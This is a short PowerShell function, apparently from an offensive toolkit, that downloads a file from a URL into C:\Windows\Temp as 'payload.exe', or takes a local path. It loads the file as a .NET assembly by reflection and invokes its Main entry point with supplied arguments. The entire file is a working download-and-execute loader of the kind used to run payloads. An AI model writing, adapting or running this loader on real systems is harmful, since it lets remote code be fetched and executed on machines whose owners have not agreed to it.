function Invoke-Exe{
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false,Position=0)]
        [string] $arguments,

        [Parameter(Mandatory=$true,Position=1)]
        [string] $loc
    )

    if($loc.StartsWith("http")){
        Invoke-WebRequest -Uri $loc -OutFile C:\\Windows\\Temp\\payload.exe
        try{
            $f = [System.Reflection.Assembly]::LoadFile("C:\\Windows\\Temp\payload.exe")
        }
        catch{
            echo "[!] Reflection not possible"
            return
        }
    }
    else{
        try{
            $f = [System.Reflection.Assembly]::LoadFile($loc)
        }
        catch{
            echo "[!] Reflection not possible"
            return 
        }        
    }
    $namespace = ([string]($f.EntryPoint | Select-Object -Property ReflectedType)).Substring(2).split("=")[1].split(",")[0]
    $obj = new-object $namespace
    $obj::Main($arguments.Split(" "))
}
